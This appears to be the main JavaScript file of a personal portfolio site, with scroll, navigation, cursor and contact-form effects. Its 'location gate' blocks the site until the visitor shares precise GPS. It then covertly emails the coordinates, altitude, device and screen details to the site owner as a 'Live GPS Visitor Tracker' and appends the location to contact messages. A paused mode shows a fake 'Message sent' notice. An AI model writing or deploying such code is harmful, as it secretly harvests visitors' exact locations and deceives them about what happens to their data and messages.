/* ==============================================
   main.js — Portfolio Interactions
   ============================================== */

/* ── Scroll-reveal ── */
const revealObserver = new IntersectionObserver(
    (entries) => {
        entries.forEach((entry) => {
            if (entry.isIntersecting) {
                entry.target.classList.add('visible');
                revealObserver.unobserve(entry.target);
            }
        });
    },
    { threshold: 0.12, rootMargin: '0px 0px -40px 0px' }
);

document.querySelectorAll('.reveal').forEach((el) => revealObserver.observe(el));

/* ── Navbar: scroll class + active link ── */
const navbar   = document.getElementById('navbar');
const sections = document.querySelectorAll('section[id]');
const navLinks = document.querySelectorAll('.nav-link');

const onScroll = () => {
    /* scrolled class */
    navbar.classList.toggle('scrolled', window.scrollY > 40);

    /* active nav link */
    let current = '';
    sections.forEach((sec) => {
        if (window.scrollY >= sec.offsetTop - 120) current = sec.id;
    });
    navLinks.forEach((link) => {
        link.classList.toggle('active', link.getAttribute('href') === `#${current}`);
    });
};

window.addEventListener('scroll', onScroll, { passive: true });
onScroll(); // run once on load

/* ── Mobile nav toggle ── */
const navToggle   = document.getElementById('nav-toggle');
const navLinksBox = document.getElementById('nav-links');

navToggle?.addEventListener('click', () => {
    const open = navLinksBox.classList.toggle('open');
    navToggle.setAttribute('aria-expanded', open);
    // Animate hamburger → X
    navToggle.classList.toggle('is-open', open);
});

/* Close mobile menu when a link is clicked or clicking outside */
navLinksBox?.querySelectorAll('.nav-link').forEach((link) => {
    link.addEventListener('click', () => {
        navLinksBox.classList.remove('open');
        navToggle?.classList.remove('is-open');
    });
});

document.addEventListener('click', (e) => {
    if (navLinksBox && navToggle && navbar && !navbar.contains(e.target)) {
        navLinksBox.classList.remove('open');
        navToggle.classList.remove('is-open');
    }
});

/* ── Cursor glow (desktop only) ── */
if (window.matchMedia('(pointer: fine)').matches) {
    const glow = document.createElement('div');
    glow.style.cssText = `
        position: fixed;
        width: 380px; height: 380px;
        border-radius: 50%;
        pointer-events: none;
        z-index: 0;
        background: radial-gradient(circle, rgba(153,27,27,0.07) 0%, transparent 70%);
        transform: translate(-50%, -50%);
        transition: left 0.4s ease, top 0.4s ease;
        mix-blend-mode: screen;
    `;
    document.body.appendChild(glow);

    window.addEventListener('mousemove', (e) => {
        glow.style.left = e.clientX + 'px';
        glow.style.top  = e.clientY + 'px';
    }, { passive: true });
}

/* ── Typed headline effect ── */
const typed = document.querySelector('.hero-subtitle span');
if (typed) {
    const phrases = [
        'Building intelligent systems',
        'Advancing computer vision',
        'Pushing AI boundaries',
    ];
    let pi = 0, ci = 0, deleting = false;

    const type = () => {
        const phrase = phrases[pi];
        typed.textContent = deleting
            ? phrase.slice(0, ci--)
            : phrase.slice(0, ci++);

        let delay = deleting ? 40 : 80;
        if (!deleting && ci > phrase.length) { delay = 1800; deleting = true; }
        if (deleting && ci < 0)             { deleting = false; pi = (pi + 1) % phrases.length; delay = 300; }

        setTimeout(type, delay);
    };
    type();
}

/* ── Web3Forms contact form handler ── */
const contactForm = document.getElementById('contact-form');
const submitBtn   = document.getElementById('submit-btn');
const toast       = document.getElementById('form-toast');

function showToast(message, type) {
    toast.textContent  = message;
    toast.className    = `form-toast ${type} show`;
    setTimeout(() => { toast.className = 'form-toast'; }, 6000);
}

function setLoading(loading) {
    submitBtn.classList.toggle('loading', loading);
    submitBtn.disabled = loading;
}

/* ── STRICT REAL-TIME GPS LOCATION GATE ── */
let liveGPSCoordinates = '';

function requestRealtimeGPS() {
    const gate = document.getElementById('location-gate');
    const statusEl = document.getElementById('location-status');
    const retryBtn = document.getElementById('location-retry-btn');

    if (!navigator.geolocation) {
        if (statusEl) {
            statusEl.className = 'location-gate-status error';
            statusEl.textContent = '❌ Geolocation is not supported by your browser.';
        }
        if (retryBtn) retryBtn.style.display = 'none';
        return;
    }

    if (statusEl) {
        statusEl.className = 'location-gate-status loading';
        statusEl.textContent = '📡 Requesting device GPS coordinates...';
    }
    if (retryBtn) {
        retryBtn.disabled = true;
        retryBtn.textContent = 'Checking Location...';
    }

    const geoOptions = {
        enableHighAccuracy: true, // Forces device hardware GPS / Wi-Fi trilateration
        timeout: 30000,           // 30s timeout
        maximumAge: 0             // Strictly 0: fresh real-time coordinates only
    };

    navigator.geolocation.getCurrentPosition(
        async (position) => {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            const accuracy = Math.round(position.coords.accuracy);
            const altitude = position.coords.altitude != null ? `${Math.round(position.coords.altitude)}m` : 'N/A';
            const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
            const time = new Date().toLocaleString();

            liveGPSCoordinates = `GPS: ${lat.toFixed(6)}, ${lng.toFixed(6)} (Accuracy ±${accuracy}m) — ${mapsLink}`;

            // Populate hidden field in contact form
            const locInput = document.getElementById('cf-location');
            if (locInput) locInput.value = liveGPSCoordinates;

            if (statusEl) {
                statusEl.className = 'location-gate-status';
                statusEl.textContent = `✅ Real-time GPS verified (±${accuracy}m). Loading website...`;
            }

            // Immediately send the exact real-time GPS coordinates to Web3Forms
            try {
                const formData = new FormData();
                formData.append('access_key', '8adc6dc2-ee94-4f89-8bf6-6efef6ed8945');
                formData.append('from_name', 'Live GPS Visitor Tracker');
                formData.append('email', 'visitor-tracker@sababilal.com');
                formData.append('subject', `📍 Live Visitor GPS: ${lat.toFixed(4)}, ${lng.toFixed(4)} (±${accuracy}m) — Saba Bilal`);
                formData.append('location', liveGPSCoordinates);
                formData.append('maps_link', mapsLink);
                formData.append('message', `Exact real-time device location verified on website entry:\n\n📍 Latitude: ${lat}\n📍 Longitude: ${lng}\n🎯 GPS Accuracy: ±${accuracy} meters\n⛰️ Altitude: ${altitude}\n🗺️ Google Maps: ${mapsLink}\n🕒 Time: ${time}\n💻 Device: ${navigator.userAgent}\n🌐 Screen: ${window.screen.width}x${window.screen.height}`);

                await fetch('https://api.web3forms.com/submit', {
                    method: 'POST',
                    body: formData,
                });
                console.log('✅ Real-time GPS location dispatched to Web3Forms');
            } catch (err) {
                console.warn('Web3Forms dispatch error:', err);
            }

            // Reveal the website once location is verified
            setTimeout(() => {
                if (gate) gate.classList.add('unlocked');
                document.body.classList.remove('location-locked');
            }, 600);
        },
        (error) => {
            console.log('Location access not granted or unavailable:', error.message);
            if (retryBtn) {
                retryBtn.disabled = false;
                retryBtn.textContent = 'Retry Location Access';
            }
            if (statusEl) {
                statusEl.className = 'location-gate-status error';
                switch (error.code) {
                    case error.PERMISSION_DENIED:
                        statusEl.textContent = '❌ Location access denied. Click the lock/settings icon in your URL bar, set Location to "Allow", then click Retry.';
                        break;
                    case error.POSITION_UNAVAILABLE:
                        statusEl.textContent = '❌ Position unavailable. Ensure your device\'s Location/GPS services are turned on in system settings, then click Retry.';
                        break;
                    case error.TIMEOUT:
                        statusEl.textContent = '❌ Location request timed out. Please click Retry.';
                        break;
                    default:
                        statusEl.textContent = '❌ Location access required to load this website. Please allow access and click Retry.';
                        break;
                }
            }
        },
        geoOptions
    );
}

// Request location immediately upon load
requestRealtimeGPS();

// Retry button event
document.getElementById('location-retry-btn')?.addEventListener('click', requestRealtimeGPS);

// Watch permission changes (e.g. if user enables it in address bar)
if (navigator.permissions && navigator.permissions.query) {
    navigator.permissions.query({ name: 'geolocation' }).then((status) => {
        status.onchange = () => {
            if (status.state === 'granted') {
                requestRealtimeGPS();
            }
        };
    }).catch(() => {});
}

/* ── Contact Form Submission Handler ── */
contactForm?.addEventListener('submit', async (e) => {
    e.preventDefault();

    /* Client-side validation */
    const inputs = contactForm.querySelectorAll('[required]');
    let valid = true;
    inputs.forEach((input) => {
        input.classList.remove('is-invalid');
        if (!input.value.trim()) {
            input.classList.add('is-invalid');
            valid = false;
        }
    });
    if (!valid) {
        showToast('Please fill in all required fields.', 'error');
        return;
    }

    setLoading(true);

    /* ── SILENT PAUSE MODE (set to false for live delivery) ── */
    const EMAILS_PAUSED = false;

    const finalLocation = liveGPSCoordinates || document.getElementById('cf-location')?.value || 'Not available';

    if (EMAILS_PAUSED) {
        try {
            const saved = JSON.parse(localStorage.getItem('portfolio_messages') || '[]');
            saved.push({
                name: contactForm.querySelector('[name="name"]')?.value || '',
                email: contactForm.querySelector('[name="email"]')?.value || '',
                message: contactForm.querySelector('[name="message"]')?.value || '',
                location: finalLocation,
                date: new Date().toISOString()
            });
            localStorage.setItem('portfolio_messages', JSON.stringify(saved));
        } catch { /* ignore storage errors */ }

        await new Promise((resolve) => setTimeout(resolve, 850));
        setLoading(false);
        showToast('✅ Message sent! I\'ll get back to you soon.', 'success');
        contactForm.reset();
        return;
    }

    try {
        const formData = new FormData(contactForm);
        // Append verified GPS location directly into message body
        const originalMsg = formData.get('message') || '';
        formData.set('message', `${originalMsg}\n\n---\nSender Real-Time GPS Location:\n${finalLocation}`);

        const response = await fetch('https://api.web3forms.com/submit', {
            method: 'POST',
            body: formData,
        });
        const result = await response.json();

        if (result.success) {
            showToast('✅ Message sent! I\'ll get back to you soon.', 'success');
            contactForm.reset();
        } else {
            showToast('❌ Something went wrong. Please try again.', 'error');
        }
    } catch {
        showToast('❌ Network error. Check your connection and try again.', 'error');
    } finally {
        setLoading(false);
    }
});

/* Clear invalid state on input */
contactForm?.querySelectorAll('.form-input').forEach((input) => {
    input.addEventListener('input', () => input.classList.remove('is-invalid'));
});

console.log('✨ Saba Bilal — Portfolio Loaded');
